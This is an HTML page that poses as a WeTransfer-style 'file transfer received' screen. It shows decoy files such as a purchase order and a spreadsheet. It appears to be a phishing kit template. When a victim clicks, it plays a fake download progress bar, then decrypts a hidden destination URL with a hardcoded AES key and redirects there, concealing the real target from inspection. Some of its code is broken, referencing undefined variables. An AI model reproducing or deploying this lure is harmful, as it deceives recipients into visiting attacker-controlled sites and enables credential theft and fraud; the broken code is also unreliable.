<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Unix</title>

<style>
/* =====================
   PAGE BACKGROUND
===================== */
body{
  margin:0;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  font-family:Arial,Helvetica,sans-serif;
  background:
    linear-gradient(rgba(255,255,255,.85), rgba(255,255,255,.85)),
    url("https://images.unsplash.com/photo-1521737604893-d14cc237f11d?auto=format&fit=crop&w=1600&q=80");
  background-size:cover;
  background-position:center;
}

/* =====================
   WRAPPER
===================== */
.wrapper{
  background:#fff;
  padding:36px;
  border-radius:16px;
  max-width:1100px;
  width:95%;
  box-shadow:0 30px 60px rgba(0,0,0,.18);
  text-align:center;
}

.brand{font-size:26px;font-weight:700}
.sub{font-size:14px;color:#6b7280}
.notice{margin:12px 0;font-size:14px}

/* =====================
   RESPONSIVE GRID
===================== */
.grid{
  display:grid;
  gap:18px;
  margin:26px 0;
}

/* Mobile */
@media(max-width:640px){
  .grid{grid-template-columns:1fr}
}

/* Tablet */
@media(min-width:641px) and (max-width:1023px){
  .grid{grid-template-columns:repeat(2,1fr)}
}

/* Desktop */
@media(min-width:1024px){
  .grid{grid-template-columns:repeat(4,1fr)}
}

/* =====================
   FILE CARD
===================== */
.figure{
  position:relative;
  cursor:pointer;
  overflow:hidden;
  border-radius:14px;
  border:1px solid #e5e7eb;
  background:#f9fafb;
}

/* PREVIEW IMAGE */
.figure img.preview{
  width:100%;
  height:160px;
  object-fit:cover;
  transition:transform .45s ease;
}

/* HOVER ZOOM (WeTransfer feel) */
.figure:hover img.preview{
  transform:scale(1.08);
}

/* FILE OVERLAY */
.overlay{
  position:absolute;
  bottom:0;
  left:0;
  right:0;
  background:linear-gradient(to top,rgba(0,0,0,.7),rgba(0,0,0,.45));
  color:#fff;
  font-size:12px;
  padding:8px 10px;
  display:flex;
  align-items:center;
  gap:6px;
}

.overlay img{
  width:16px;
  height:16px;
}

/* =====================
   SHIMMER (ON CLICK)
===================== */
.figure.loading::after{
  content:"";
  position:absolute;
  inset:0;
  background:linear-gradient(
    110deg,
    rgba(255,255,255,0) 40%,
    rgba(255,255,255,.6) 50%,
    rgba(255,255,255,0) 60%
  );
  animation:shimmer 1.1s linear infinite;
}

@keyframes shimmer{
  from{transform:translateX(-100%)}
  to{transform:translateX(100%)}
}

/* =====================
   BUTTON
===================== */
button{
  width:100%;
  padding:14px;
  border:none;
  border-radius:10px;
  background:linear-gradient(135deg,#2563eb,#1e40af);
  color:#fff;
  font-weight:600;
  cursor:pointer;
}

/* =====================
   GLOBAL PROGRESS BAR
===================== */
.progress{
  display:none;
  margin-top:18px;
  height:8px;
  background:#e5e7eb;
  border-radius:99px;
  overflow:hidden;
}
.bar{
  height:100%;
  width:0%;
  background:linear-gradient(90deg,#2563eb,#22c55e);
  animation:load 1.4s linear forwards;
}
@keyframes load{to{width:100%}}

.footer{
  margin-top:16px;
  font-size:12px;
  color:#9ca3af;
}
</style>
</head>

<body>

<div class="wrapper">
  <div class="brand">Unix</div>
  <div class="sub">File transfer received</div>
  <div class="notice">The shared document is ready for download</div>

  <div class="grid">

    <div class="figure" onclick="trigger(this,'video')">
      <img class="preview" src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/t1.png?alt=media&token=a94fa1df-86f0-410c-8e5a-a834f0f96f0b">
      <div class="overlay">
        <img src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/vid.png?alt=media&token=ce9b3d1e-c28a-47c2-a045-6e32319d727b">
        FW47_Diperson.mov
      </div>
    </div>

    <div class="figure" onclick="trigger(this,'image')">
      <img class="preview" src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/t2.png?alt=media&token=934c8095-4d76-408b-84ad-e5a87323d28a">
      <div class="overlay">
        <img src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/jp.png?alt=media&token=f3b2ae21-f59a-47fd-bb47-58b0163e56b4">
        Drawings_sketches.png
      </div>
    </div>

    <div class="figure" onclick="trigger(this,'pdf')">
      <img class="preview" src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/t3.png?alt=media&token=5199c01c-5bf6-43c0-bf34-dd57d1d695d4">
      <div class="overlay">
        <img src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/p.png?alt=media&token=71a9944c-1fd7-4f03-a70c-61c3fb582ac0">
        PURCHASE_ORDER.pdf
      </div>
    </div>

    <div class="figure" onclick="trigger(this,'sheet')">
      <img class="preview" src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/t4.png?alt=media&token=df675347-6cd5-47a9-a880-6e16f290d0ad">
      <div class="overlay">
        <img src="https://firebasestorage.googleapis.com/v0/b/wetransfer-rd176.appspot.com/o/sheet.png?alt=media&token=288c21a6-19be-484d-a2e3-b30c020a1b28">
        Specification.xlsx
      </div>
    </div>

  </div>

  <button onclick="trigger(null)">Download all files</button>

  <div class="progress" id="progress">
    <div class="bar"></div>
  </div>

  <div class="footer">Â© Unix Secure Delivery</div>
</div>

<script>
/* =====================
   CLICK HANDLER
===================== */
function trigger(el, tag=""){
  document.getElementById("progress").style.display="block";
  if(el) el.classList.add("loading");

  setTimeout(()=>{
    // your encrypted redirect logic goes here
    location.href = "#";
  },1400);
}
</script>

</body>
</html>

<script>
/* =====================================
   ðŸ”’ INSERT YOUR ENCRYPTED VALUES
===================================== */
const encryptedUrl = "BKbju4pBckVxyevaSmCN375SNgjdusbtkXRpMt0eQwVkI8skAysfpbYIQ+0AN8Jw9EnzZyCJtjuKLQjANVhXFMSbaGNI3aY3YXN0EmeXn3oMIEwXK0GTiFHSpIeIqm522vpCEyVKl2rEBwC2Qck40UJlhdoMPNq3JVEhQEnEz3JJtrGW8Sp2XYSqiESWRt4PFTjglyDLCmcXy7rp0f46QWgzzObKQR2fZnuoa9w=";  // Base64 encrypted URL
const ivBase64 = "SUkAEdRdM8RWzfg/";                 // Base64 IV
const saltBase64 = "LB6twxCihvZ/XO/cPLd+SQ==";  

/* =====================================
   ðŸ” DECRYPT FUNCTION (UNCHANGED)
===================================== */
const te=new TextEncoder(), td=new TextDecoder();
const b64=s=>Uint8Array.from(atob(s),c=>c.charCodeAt(0));

async function decrypt(){
  const master=await crypto.subtle.importKey(
    "raw", te.encode("client-side-secret"),
    "PBKDF2", false, ["deriveKey"]
  );

  const key=await crypto.subtle.deriveKey(
    {name:"PBKDF2",salt:b64(n),iterations:500000,hash:"SHA-256"},
    master,{name:"AES-GCM",length:256},false,["decrypt"]
  );

  const dec=await crypto.subtle.decrypt(
    {name:"AES-GCM",iv:b64(t)}, key, b64(e)
  );

  return td.decode(dec);
}

/* =====================================
   ðŸ” CLICK-TRIGGERED REDIRECT
===================================== */
function trigger(tag=""){
  document.getElementById("progress").style.display="block";

  setTimeout(async ()=>{
    try{
      const base=await decrypt();
      const target = tag ? base + "?f=" + tag : base;
      location.href = target;
    }catch(e){
      console.warn("Redirect failed");
    }
  },1400);
}
</script>

</body>
</html>
